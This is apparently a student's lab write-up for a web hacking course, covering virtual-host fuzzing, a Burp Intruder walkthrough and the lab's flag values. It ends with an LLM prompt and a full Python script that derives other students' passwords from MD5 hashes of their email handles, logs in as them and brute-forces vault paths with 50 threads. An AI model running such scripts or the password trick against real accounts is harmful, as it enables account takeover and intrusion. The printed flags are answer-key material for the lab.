---
title: "Web Hacking II - SEC 450"
pubDate: "2025-10-28"
description: "Advanced web fuzzing techniques and automated vault cracking with custom Python tooling"
category: lab
image: "/writeups/web-hacking-ii-sec-450/page_28_img_1.png"
tags: 
    - cybersecurity
    - lab
    - sec450
---

## Introduction

This writeup covers my most challenging web security lab from Bellevue College - an advanced fuzzing and enumeration exercise that really tested my problem-solving skills. I've documented my approach to discovering hidden virtual hosts and automating attacks, including a custom Python script I developed (with some AI assistance, which I'm transparent about). This lab pushed me to think creatively about automation and efficiency in security testing.

## Finding all VHOSTS

### Steps To Complete
1. Fuzz for VHOSTS using wordlist provided, this method of fuzzing is less ideal for real world attacks since the DNS entries for VHOSTS will not match `<SUBDOMAIN>.<DOMAIN>.<TOP-LEVEL DOMAIN>`

![Image 1](/writeups/web-hacking-ii-sec-450/page_2_img_1.png)

## forbidden.ethicalhacking.academy

### Steps To Complete
1. Fuzz, find out 403, fuzz again for 200 status code, using found 403 word.


![Image 1](/writeups/web-hacking-ii-sec-450/page_3_img_1.png)

![Image 1](/writeups/web-hacking-ii-sec-450/page_4_img_1.png)

![Image 1](/writeups/web-hacking-ii-sec-450/page_5_img_1.png)

![Image 2](/writeups/web-hacking-ii-sec-450/page_5_img_2.png)

## guardian.ethicalhacking.academy

### Steps To Complete
1. Fuzz, refine search, (remove responses with size of 265) fuzz again.

![Image 1](/writeups/web-hacking-ii-sec-450/page_6_img_1.png)

![Image 1](/writeups/web-hacking-ii-sec-450/page_7_img_1.png)

![Image 2](/writeups/web-hacking-ii-sec-450/page_7_img_2.png)

## labyrinth.ethicalhacking.academy

### Steps To Complete
1. Fuzz, use -v flag, fuzz again, apply the -fr wrong

![Image 1](/writeups/web-hacking-ii-sec-450/page_8_img_1.png)
![Image 1](/writeups/web-hacking-ii-sec-450/page_9_img_1.png)

## headcanon.ethicalhacking.academy

### Steps To Complete
1. Burpsuite / Browser, view /brute source code
2. Try POST header, Try POST header with extra header elements
3. Fuzz the X-Auth-Passphrase=FUZZ


![Image 1](/writeups/web-hacking-ii-sec-450/page_10_img_1.png)

![Image 1](/writeups/web-hacking-ii-sec-450/page_11_img_1.png)

![Image 1](/writeups/web-hacking-ii-sec-450/page_12_img_1.png)

## palindromeda.ethicalhacking.academy

### Steps To Complete
1. Use the hints to deduce that you should try palindromeda in reverse!


![Image 1](/writeups/web-hacking-ii-sec-450/page_13_img_1.png)

![Image 1](/writeups/web-hacking-ii-sec-450/page_14_img_1.png)

![Image 1](/writeups/web-hacking-ii-sec-450/page_15_img_1.png)

![Image 1](/writeups/web-hacking-ii-sec-450/page_16_img_1.png)

## vault.ethicalhacking.academy

### Steps To Complete
1. Solve riddle to determine expected route of attack.


![Image 1](/writeups/web-hacking-ii-sec-450/page_17_img_1.png)

2. Forbidden (325) -> Guardian (505) -> Labyrinth (361) -> Headcanon (531) -> Palindromeda (509)
3. Turn partial keys into words using fuzzing and filtering for specific error codes.
4. Save generated key_fragment cookies when visiting in a browser or using BurpSuite.

![Image 1](/writeups/web-hacking-ii-sec-450/page_18_img_1.png)

5. Repeat previous steps…

![Image 1](/writeups/web-hacking-ii-sec-450/page_19_img_1.png)

![Image 1](/writeups/web-hacking-ii-sec-450/page_20_img_1.png)

![Image 1](/writeups/web-hacking-ii-sec-450/page_21_img_1.png)

6. Find Bronze Flag with three cookies!
![Image 1](/writeups/web-hacking-ii-sec-450/page_22_img_1.png)

{"flag":"br0nz3_f1r3"}


![Image 1](/writeups/web-hacking-ii-sec-450/page_23_img_1.png)

7. Find Silver Flag with four cookies!
![Image 1](/writeups/web-hacking-ii-sec-450/page_24_img_1.png)

{"flag":"51lv3r_f1r3"}


![Image 1](/writeups/web-hacking-ii-sec-450/page_25_img_1.png)

8. Find Gold flag with five cookies!
![Image 1](/writeups/web-hacking-ii-sec-450/page_26_img_1.png)

{"flag":"g0ld_v4ult_0p3n"}

## Solving vault.ethicalhacking.academy w/o any partial keys

### Steps To Complete
1. Using BurpSuite it can be intuited that certain keywords seem to set the cookies, it's just a matter of fuzzing for the right ones.


![Image 1](/writeups/web-hacking-ii-sec-450/page_27_img_1.png)
### MINI STEP BY STEP FOR INTRUDER ATTACK ON BURPSUITE:
1. Capture and send over to intruder a valid /key_vault/ request, set /key_vault/FUZZ and load wordlist.
2. Setup a Grep – Extract for Set-Cookie: key_fragment to generate a sortable table of available cookies.
3. Run attack.
4. Use the table in the generated data from attack to search for valid key_fragments.

2. Using this knowledge, we can devise a script to attack vault.ethicalhacking.academy for the right set of words. Additionally, since we can programmatically figure out the passwords to any students account using a simple md5 hash and filter we can create a --user flag in the script to attack any student's vault.

![Image 1](/writeups/web-hacking-ii-sec-450/page_28_img_1.png)

### Prompt
I will be candid I used an LLM to create this script. Here's the prompt I used:

```md
# Vault Automation Script Requirements

## Target
- **Primary URL**: vault.ethicalhacking.academy
- **Objective**: Automate the "unintended way" attack against the vault system

## Command-Line Interface
- **MUST** accept `-u` or `--user` flag for BC email handle
- **MUST** accept `-w` or `--wordlist` flag for wordlist file path
- **MUST** display help page when run without arguments
- **MUST** provide usage examples in help output
- **SHOULD** validate that wordlist file exists before proceeding

## Authentication Process
- **MUST** authenticate using provided BC email handle format (e.g., `l.dale`)


- **MUST** generate password as first 8 characters of MD5 hash of the email handle
- **MUST** capture and maintain JWT token from authentication cookies
- **MUST** use JWT token in all subsequent fuzzing requests
- **SHOULD** redirect from login to `/key_vault/` endpoint

## Fuzzing Strategy
- **MUST** perform directory fuzzing starting at `/key_vault/FUZZ` (without trailing slash)
- **MUST** identify correct responses by presence of `key_fragmentx=<hash>` cookie being set
- **MUST** validate that fragment values are legitimate hexadecimal hashes (not placeholder values like 'xxxxxxxxxxxx')
- **MUST** look for unusual HTTP status codes (not 200, 404, 403, 500, 502, 503) as success indicators
- **MUST** capture and store all `key_fragmentx` cookies when found (x = 1,2,3,4,5)
- **MUST** continue fuzzing deeper: `/key_vault/<word>/FUZZ`, `/key_vault/<word>/<word>/FUZZ`, etc.
- **MUST** maintain JWT token and all captured `key_fragmentx` cookies across requests
- **MUST** continue until complete 5-level path achieved: `/key_vault/<word>/<word>/<word>/<word>/<word>/`
- **MUST** use provided wordlist file for fuzzing attempts
- **MUST** stop fuzzing current level immediately upon finding valid fragment (early termination)

## Performance Requirements
- **MUST** utilize maximum system resources for efficiency with 50 concurrent threads
- **MUST** implement concurrent/threaded requests for speed using ThreadPoolExecutor
- **MUST** cancel remaining futures when valid path found to optimize performance
- **SHOULD** implement connection pooling and session reuse

## Operational Requirements
- **MUST** implement graceful shutdown on CTRL+C (SIGINT) with proper cleanup
- **MUST** preserve discovered fragments during interruption
- **MUST** provide progress indicators and status updates for each level
- **MUST** log successful discoveries with HTTP status codes and fragment values
- **MUST** display wordlist size when loaded
- **SHOULD** show current fuzzing path and level being tested

## Technical Constraints
- **MUST** handle JWT authentication properly with cookie management
- **MUST** maintain session cookies throughout fuzzing process
- **MUST** handle various HTTP response codes appropriately
- **MUST** validate fragment cookies are legitimate hex values (minimum 8 characters)
- **MUST** exclude invalid placeholder values ('xxxxxxxxxxxx')
- **SHOULD** implement proper error handling and retries
- **SHOULD** handle missing wordlist files gracefully

## Wordlist Requirements
- **MUST** support custom wordlist files via command-line argument
- **MUST** handle wordlist file not found errors gracefully
- **SHOULD** support large wordlists (60k+ entries) efficiently
- **SHOULD** strip whitespace and empty lines from wordlist entries

## Success Criteria
- **MUST** successfully authenticate and obtain JWT token
- **MUST** discover all 5 key fragments through automated fuzzing
- **MUST** construct complete 5-level URL path
- **MUST** validate each fragment is a legitimate hexadecimal hash
- **SHOULD** complete process faster than manual methods
- **SHOULD** provide clear success/failure reporting with fragment summary

## Error Handling
- **MUST** handle network timeouts and connection errors gracefully
- **MUST** continue fuzzing despite individual request failures
- **MUST** provide meaningful error messages for authentication failures
- **MUST** exit cleanly on missing required arguments or files
- **SHOULD** implement retry logic for transient network errors

## Output Requirements
- **MUST** provide clear progress indicators for each fuzzing level
- **MUST** display discovered fragments with their values and discovery paths
- **MUST** show HTTP status codes for successful discoveries
- **MUST** provide final summary of complete path and all fragments
- **SHOULD** use consistent formatting for status messages ([+], [-], [*], [!])
```
- Source: Amazon Q

### Script
Here's the generated script:

```python
#!/usr/bin/env python3

import requests
import hashlib
import signal
import sys
import argparse
from concurrent.futures import ThreadPoolExecutor
from threading import Lock

class VaultCracker:
    def __init__(self):
        # Initialize session and tracking variables
        self.session = requests.Session()
        self.base_url = "https://vault.ethicalhacking.academy"
        self.found_fragments = {}  # Store discovered key fragments
        self.found_paths = []      # Store discovered path components
        self.lock = Lock()         # Thread safety for concurrent operations
        self.running = True        # Control flag for graceful shutdown
        self.jwt_token = None      # JWT token from authentication
        
    def signal_handler(self, signum, frame):
        """Handle CTRL+C gracefully"""
        print("\n[!] Graceful shutdown initiated...")
        self.running = False
        
    def get_wordlist(self, wordlist_file):
        """Load wordlist from specified file"""
        try:
            with open(wordlist_file, 'r') as f:
                return [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print(f"[-] Wordlist file '{wordlist_file}' not found")
            sys.exit(1)

    def authenticate(self, email):
        """Authenticate with BC email and MD5-derived password"""
        # Generate password as first 8 chars of MD5 hash of email
        password = hashlib.md5(email.encode()).hexdigest()[:8]
        print(f"[+] Authenticating with {email}:{password}")
        
        # Submit login credentials
        login_data = {'username': email, 'password': password}
        response = self.session.post(f"{self.base_url}/login", data=login_data, allow_redirects=True)
        
        # Check for successful authentication and extract JWT token
        if response.status_code == 200 and 'key_vault' in response.url:
            if 'token' in self.session.cookies:
                self.jwt_token = self.session.cookies['token']
                print(f"[+] Authentication successful")
                return True
        return False

    def test_path(self, path, level):
        """Test a single path for valid key fragments"""
        if not self.running:
            return None
            
        try:
            # Build cookie header with JWT token and any previously found fragments
            cookies = {'token': self.jwt_token}
            cookies.update(self.found_fragments)
            
            # Make request to test path
            response = requests.get(f"{self.base_url}{path}", cookies=cookies)
            fragment_key = f"key_fragment{level}"
            
            # Check for unusual HTTP status codes (indicates potential success)
            # Normal codes like 200, 404, 403, 500 are ignored
            if response.status_code not in [200, 404, 403, 500, 502, 503]:
                # Check if the expected fragment cookie is set
                if fragment_key in response.cookies:
                    fragment_value = response.cookies[fragment_key]
                    
                    # Validate that it's a real hex hash (not placeholder like 'xxxxxxxxxxxx')
                    if (len(fragment_value) >= 8 and 
                        all(c in '0123456789abcdef' for c in fragment_value.lower()) and
                        fragment_value != 'xxxxxxxxxxxx'):
                        
                        # Thread-safe storage of discovered fragment
                        with self.lock:
                            if fragment_key not in self.found_fragments:
                                self.found_fragments[fragment_key] = fragment_value
                                print(f"[+] Found {fragment_key}={fragment_value} at {path} (HTTP {response.status_code})")
                                # Return the word that was successful
                                return path.split('/')[-1]
        except:
            pass
        return None

    def fuzz_level(self, current_path, level, wordlist):
        """Fuzz a specific level of the directory structure"""
        print(f"[*] Fuzzing level {level} at {current_path}")
        
        # Use thread pool for concurrent fuzzing (50 threads for speed)
        with ThreadPoolExecutor(max_workers=50) as executor:
            futures = []
            
            # Submit all wordlist entries for testing
            for word in wordlist:
                if not self.running:
                    break
                test_path = f"{current_path}{word}"
                future = executor.submit(self.test_path, test_path, level)
                futures.append((future, word))
            
            # Check results as they complete
            for future, word in futures:
                if not self.running:
                    break
                result = future.result()
                if result:  # Found a valid path - stop fuzzing this level
                    # Cancel remaining futures to stop unnecessary work
                    for remaining_future, _ in futures:
                        remaining_future.cancel()
                    return result
        return None

    def crack_vault(self, email, wordlist_file):
        """Main cracking logic - authenticate and fuzz through 5 levels"""
        # Authenticate with the vault
        if not self.authenticate(email):
            print("[-] Authentication failed")
            return
        
        # Load fuzzing wordlist
        wordlist = self.get_wordlist(wordlist_file)
        print(f"[+] Loaded {len(wordlist)} words from {wordlist_file}")
        current_path = "/key_vault/"
        
        # Fuzz through 5 levels of directory structure
        for level in range(1, 6):
            if not self.running:
                break
                
            # Find valid word for this level
            found_word = self.fuzz_level(current_path, level, wordlist)
            if found_word:
                # Build path for next level
                current_path += f"{found_word}/"
                self.found_paths.append(found_word)
                print(f"[+] Level {level} complete. Path: {current_path}")
            else:
                print(f"[-] No valid word found for level {level}")
                break
        
        # Report final results
        if len(self.found_fragments) == 5:
            print(f"\n[+] SUCCESS! Complete path: {current_path}")
            print(f"[+] Found fragments: {self.found_fragments}")
        else:
            print(f"\n[-] Incomplete. Found {len(self.found_fragments)}/5 fragments")

def main():
    """Entry point - parse arguments, setup signal handling and start cracking"""
    parser = argparse.ArgumentParser(
        description='Vault Cracker - Automated fuzzing tool for vault.ethicalhacking.academy',
        epilog='''
Examples:
  %(prog)s -u l.dale -w wordlist.txt
  %(prog)s -u ben.klimala -w raft-medium-words.txt
  %(prog)s --user john.doe --wordlist /path/to/custom-wordlist.txt
        ''',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument('-u', '--user', required=True, help='BC email handle (e.g., l.dale)')
    parser.add_argument('-w', '--wordlist', required=True, help='Path to wordlist file')
    
    # Show help if no arguments provided
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(1)
    
    args = parser.parse_args()
    
    cracker = VaultCracker()
    signal.signal(signal.SIGINT, cracker.signal_handler)
    
    try:
        cracker.crack_vault(args.user, args.wordlist)
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")

if __name__ == "__main__":
    main()
```

- Source: Amazon Q

### Explanation
At a high level this script pretty much works the way the BurpSuite intruder attack worked but automating a lot of the steps. After attempting a login with provided username and generated password it stores the JWT token it gets in response. It then fuzzes and searches the output for Set-Cookie: headers and then scans them for valid hashes using this if statement:

```python
# Validate that it's a real hex hash (not placeholder like 'xxxxxxxxxxxx')
if (len(fragment_value) >= 8 and 
    all(c in '0123456789abcdef' for c in fragment_value.lower()) and
    fragment_value != 'xxxxxxxxxxxx'):
```

If it matches a valid hash it is saved and then the next level is fuzzed with requests being made with the found word and cookie. Rinse repeat and you eventually discover a set of keywords and HTTP codes which lead to the gold flag.

I won't pretend that I understand the higher-level stuff like concurrent threads or session re-using but their addition does make this script a hell of a lot faster. Additionally, once a good keyword is found it immediately stops fuzzing and continues to the next level, increasing speed tremendously.

Additionally, the script has a multitude of useful features like graceful exiting via CTRL + C, a help page, the ability to accept any wordlist.